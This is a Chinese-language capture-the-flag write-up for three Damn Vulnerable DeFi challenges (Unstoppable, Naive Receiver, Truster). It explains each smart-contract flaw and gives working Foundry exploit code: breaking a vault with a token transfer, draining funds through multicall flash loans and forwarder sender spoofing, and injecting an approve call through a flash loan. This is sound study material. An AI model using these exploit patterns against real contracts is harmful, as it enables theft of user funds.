## Damn Vulnerable DeFi Writeup [SunSec]


### Unstoppable

題目: 
有一個代幣化的金庫，存入了100萬個DVT代幣。該金庫提供免費的閃電貸款，直到寬限期結束。為了在完全無需許可前捕捉任何錯誤，開發者決定在測試網中進行實時測試。還有一個監控合約，用來檢查閃電貸款功能的運行狀況。從餘額為10個DVT代幣開始，展示如何使金庫停止運行。必須讓它停止提供閃電貸款。

過關條件:
- 讓 flashLoan 功能失效

解題:
只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。

```
 if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
```

[POC:](./damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 
```
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 123);   
    }
```



### Naive Receiver

題目: 
有一個資金池，餘額為1000 WETH，並提供閃電貸款。它收取固定費用為1 WETH。該資金池通過整合無需許可的轉發合約，支持元交易。一名使用者部署了一個餘額為10 WETH的範例合約。看起來它可以執行WETH的閃電貸款。所有資金都面臨風險！將使用者和資金池中的所有WETH救出，並將其存入指定的recovery賬戶。

過關條件:
- 必須執行兩次或更少的交易。確保 vm.getNonce(player) 小於等於2
- 確保 weth.balanceOf(address(receiver)) 為 0
- 確保 weth.balanceOf(address(pool)) 為 0
- 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。

解題:
- NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 
[ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): 閃電貸模組和允許閃電貸的 {ERC20} 擴充.
- FlashLoanReceiver 題目初始有10ETH,每次接收的 Flashloan 會支付1ETH手續費給 Pool. 但問題在於 onFlashLoan 沒有檢查發起 Flashloan是不是授權的來源. 所以我們只要發送10次 Flashloan 然後 amount 帶入0. 就可以把FlashLoanReceiver的10ETH轉走. 但是題目要求 Nonce 要小於2. 在前面有提到 NaiveReceiverPool 繼承 Multicall.  所以我們可以透過Multicall執行一次交易操作10次Flashloan就可以滿足 Nonce 小於2.
- 再來要想辦法把 NaiveReceiverPool 初始的1000ETH轉走. 從合約中可以看到唯一可以把資產轉走的function 是 withdraw. 可以發現到 _msgSender 需滿足 msg.sender == trustedForwarder && msg.data.length >= 20. 就可以返回最後20bytes 地址. 這邊是可以操控的.
- 再來是滿足 msg.sender == trustedForwarder. 這裡就要透過 forwarder 執行 meta-transaction.  

```
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
            //bytes20：將 msg.data 中最後 20 個字節轉換為 address 類型
        } else {
            return super._msgSender();
        }
    }

```
[POC](./damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol) : 
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```

### Truster

題目: 
越來越多的借貸池提供閃電貸款。在這個情況下，一個新的池子已經啟動，提供免費的 DVT 代幣閃電貸款。該池子持有 100 萬個 DVT 代幣。而你什麼都沒有。要通過這個挑戰，你需要在一筆交易中拯救池子中的所有資金，並將這些資金存入指定的恢復賬戶。

過關條件:
- 只能執行1筆交易
- 救援資金發送至 recovery 帳戶

解題:
- 在 floashLoan 中可以看到 target.functionCall(data); 可以執行任意calldata且target的地址可控. 可直接執行任意指令.

[POC](./damn-vulnerable-defi/test/truster/Truster.t.sol) : 
```
    function test_truster() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(pool), address(token),address(recovery));
    }
    
 contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
    }
}
```
